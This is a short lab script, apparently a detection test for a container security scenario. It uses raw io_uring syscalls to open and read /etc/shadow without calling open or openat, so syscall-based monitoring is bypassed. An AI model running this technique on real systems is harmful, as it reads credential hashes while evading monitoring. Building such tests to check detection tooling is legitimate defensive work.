#!/bin/sh
# SPDX-License-Identifier: Apache-2.0
# Lab use only. Runs inside the scenario's target pod.
# A single IORING_OP_OPENAT submitted through a ring set up with raw system
# calls; nothing calls open(2) or openat(2) for the file.
python3 - <<'PY'
import ctypes, mmap, os, struct
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
SYS_setup, SYS_enter = 425, 426
params = ctypes.create_string_buffer(120)
fd = libc.syscall(SYS_setup, 4, params)
if fd < 0:
    raise SystemExit(f"io_uring_setup: errno {ctypes.get_errno()}")
sq_entries, cq_entries = struct.unpack_from("II", params, 0)
sq = struct.unpack_from("IIIIIIII", params, 40)   # head tail mask entries flags dropped array resv
cq = struct.unpack_from("IIIIII", params, 80)     # head tail mask entries overflow cqes
sq_ring = mmap.mmap(fd, sq[6] + sq_entries * 4, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE, offset=0)
cq_ring = mmap.mmap(fd, cq[5] + cq_entries * 16, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE, offset=0x8000000)
sqes = mmap.mmap(fd, sq_entries * 64, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE, offset=0x10000000)
path = ctypes.create_string_buffer(b"/etc/shadow")
IORING_OP_OPENAT, AT_FDCWD = 18, -100
sqe = bytearray(64)
struct.pack_into("<BBHi", sqe, 0, IORING_OP_OPENAT, 0, 0, AT_FDCWD)
struct.pack_into("<Q", sqe, 16, ctypes.addressof(path))
struct.pack_into("<II", sqe, 24, 0, os.O_RDONLY)
struct.pack_into("<Q", sqe, 32, 7)
sqes[0:64] = bytes(sqe)
tail = struct.unpack_from("I", sq_ring, sq[1])[0]
struct.pack_into("I", sq_ring, sq[6] + (tail & sq[2]) * 4, 0)
struct.pack_into("I", sq_ring, sq[1], tail + 1)
if libc.syscall(SYS_enter, fd, 1, 1, 1, None, 0) < 0:
    raise SystemExit(f"io_uring_enter: errno {ctypes.get_errno()}")
head = struct.unpack_from("I", cq_ring, cq[0])[0]
user_data, res = struct.unpack_from("<Qi", cq_ring, cq[5] + (head & cq[2]) * 16)
if res < 0:
    raise SystemExit(f"openat through io_uring: errno {-res}")
print("opened through io_uring, fd", res, "bytes", len(os.read(res, 4096)))
PY
